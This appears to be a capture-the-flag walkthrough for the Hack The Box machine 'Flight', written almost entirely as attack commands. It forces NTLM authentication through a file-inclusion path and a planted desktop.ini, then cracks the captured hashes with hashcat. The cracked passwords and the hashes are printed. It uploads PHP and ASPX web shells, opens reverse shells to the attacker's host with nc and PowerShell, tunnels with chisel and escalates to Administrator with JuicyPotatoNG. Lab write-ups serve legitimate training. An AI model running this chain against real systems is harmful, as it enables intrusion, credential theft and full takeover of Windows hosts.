echo "10.10.11.187 flight.htb" >> /etc/hosts

service apache2 start

nmap -sC -sV flight.htb
wfuzz -c -w ../subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154 -> school

echo "10.10.11.187 flight.htb school.flight.htb" >> /etc/hosts
dorsearch -u school.flight.htb

#web
http://school.flight.htb/index.php?view=//<kali IP>/test
#terminal 2:
responder -I tun0 -wPv

svc_apache::flight:90b54e5073440f91:DACEA051848BC07064B8F1F6CF6ECAFD:0101000000000000003EECF9970ED90152190EB7403C9CC30000000002000800520039003200340001001E00570049004E002D0055004A00340056004D0055003700580046004700310004003400570049004E002D0055004A00340056004D005500370058004600470031002E0052003900320034002E004C004F00430041004C000300140052003900320034002E004C004F00430041004C000500140052003900320034002E004C004F00430041004C0007000800003EECF9970ED90106000400020000000800300030000000000000000000000000300000E07D4392A4BC40C85784D45E08300CFC51A6ED1E43328109EE9B0274E51796EC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310033000000000000000000 -> save as flight_svc_apache.txt

hashcat -a 0 -m 5600 flight_svc_apache.txt ../rockyou.txt
hashcat -a 0 -m 5600 flight_svc_apache.txt ../rockyou.txt --show
S@Ss!K@*t13

smbclient -L //flight.htb/ -U svc_apache -> type password
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users -> write each username on user.txt
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success -> s.moon and svc_apache have tha same password

nano desktop.ini
[.ShellClassInfo]
IconResource=//<kali IP>/test2

#terminal
smbclient //flight.htb/shared -U S.moon -> type password
put desktop.ini

#terminal 2:
responder -I tun0 -wPv
c.bum::flight.htb:c69dd0be9d4ce77f:00496C1DA43547AFEB8ED388C9C0DA2D:010100000000000000C6E5869D0ED901BE5A960CC06FDB0D00000000020008004B0038005000440001001E00570049004E002D0057003700590036004D0057005900520038004900380004003400570049004E002D0057003700590036004D005700590052003800490038002E004B003800500044002E004C004F00430041004C00030014004B003800500044002E004C004F00430041004C00050014004B003800500044002E004C004F00430041004C000700080000C6E5869D0ED90106000400020000000800300030000000000000000000000000300000E07D4392A4BC40C85784D45E08300CFC51A6ED1E43328109EE9B0274E51796EC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310033000000000000000000 -> save as flight_c_bum.txt

hashcat -a 0 -m 5600 flight_c_bum.txt ../rockyou.txt
hashcat -a 0 -m 5600 flight_c_bum.txt ../rockyou.txt --show
Tikkycoll_431012284

smbclient //flight.htb/Web -U c.bum -> type password
ls
cd flight.htb
put p0wny-shell.php shell.php (https://github.com/flozz/p0wny-shell)
put runas.exe (https://github.com/antonioCoco/RunasCs/tree/master -> need to compilar on Windows: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:Runas.exe RunasCs.cs)

open 4 terminals

#terminal 1
nc -nvlp 9003
cd C:/User/C.Bum/Desktop
type user.txt -> e2cb2b54b3ca93eb4a823e59da05a413
#web shell
.\runas.exe c.bum Tikkycoll_431012284 powershell -r <kali IP>:9003

#terminal 2
nc -nvlp 9005
#web shell
.\runas.exe c.bum Tikkycoll_431012284 powershell -r <kali IP>:9005

#terminal 3
apt-get install chisel
download chisel.exe (https://github.com/jpillora/chisel -> Releases -> Download chisel_1.8.1_windows_amd64.gz, extract and rename chisel.exe)
cp chisel.exe /var/www/html

download cmd.aspx (https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)
cp cmd.aspx /var/www/html

download https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1 -> JicyPotatoNg.zip -> extract
cp JicyPotatoNg.exe /var/www/html

download https://github.com/int0x33/nc.exe/ -> nc64.exe
cp nc64.exe /var/www/html

#terminal 1
cd c:/xampp/htdocs/flight.htb
curl http://<kali IP>/chisel.exe -o chisel.exe

#terminal 4
chisel server --reverse -p 9999

#terminal 1
.\chisel.exe client <kali IP>:9999 R:8000:127.0.0.1:8000

Now, you can acess 127.0.0.1:8000 -> get Flight page

#terminal 2
cd C:/inetpub/development
curl http://<kali IP>/cmd.aspx -o cmd.aspx

curl http://<kali IP>/nc64.exe -o nc.exe
curl http://<kali IP>/JuicyPotatoNG.exe -o potato.exe

#web
access 127.0.0.1:8000/cmd.aspx
Go to https://www.revshells.com and generate PowerShell #3 (Base64) -> set port 9010

#terminal 3
nc -nvlp 9010

#web
On arguments -> /c <powershell -e ....> -> get rev shell iis apppool\defaultapppool

#terminal 3
C:\inetpub\development.\potato.exe -t * -p "C:\inetpub\development.\nc.exe" -a "<kali IP> 9010 -e cmd.exe"
cd Users/Administrator/Desktop
type root.txt -> 53f873c62f2c62e04b5ed0bfa3e1441e
